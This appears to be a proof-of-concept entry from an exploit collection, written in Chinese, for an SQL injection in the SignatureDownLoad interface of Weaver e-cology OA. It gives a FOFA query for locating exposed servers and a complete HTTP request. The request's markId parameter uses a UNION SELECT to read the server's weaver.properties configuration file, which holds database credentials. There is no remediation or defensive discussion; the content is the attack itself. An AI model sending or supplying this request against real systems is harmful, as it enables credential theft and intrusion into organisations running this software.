## 泛微E-Cology系统接口SignatureDownLoad存在SQL注入漏洞

## fofa
```
app="泛微-OA（e-cology）"
```

## poc
```
GET /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27 HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
```

![3597e4a40959cd3638fb62bcdf38b282](https://github.com/wy876/POC/assets/139549762/39a01c4b-3697-4c83-8840-cdb444ff38ce)
